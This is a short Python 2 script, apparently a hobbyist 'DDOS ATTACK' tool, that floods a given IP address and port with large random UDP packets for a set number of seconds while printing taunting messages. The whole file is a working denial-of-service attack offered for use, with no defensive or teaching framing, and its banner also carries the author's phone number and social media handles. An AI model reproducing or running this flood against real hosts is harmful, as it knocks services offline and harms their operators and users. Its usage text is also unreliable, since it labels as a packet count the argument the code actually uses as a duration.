import time
import socket
import random
import sys
def usage():

    print "\033[1;91m                        ==============="
    print "\033[1;32m                        | DDOS ATTACK |"
    print "\033[1;91m                        ==============="
    print "\033[1;32m"
    print "Command   : \033[1;91m python2 ddosattack.py <IP> <PORT> <PACKET>"
    print "\033[1;32m"
    print "Creator   : \033[1;91m OxLynx"
    print "\033[1;32m"
    print "Whatsapp  : \033[1;91m 085850252221"
    print "\033[1;32m"
    print "Facebook  : \033[1;91m Bagus P"
    print "\033[1;32m"
    print "Instagram : \033[1;91m @bagusp073"
    print "\033[1;32m"

def flood(victim, vport, duration):
    # Subscribe Youtube : OxLynx
    # Like Subscribe
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Berfikir Global Bersikap Lokal
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mGaskeun Cuk \033[1;32m%s \033[1;91mMamposs Njeng \033[1;32m%s \033[1;91mWkwkwk \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

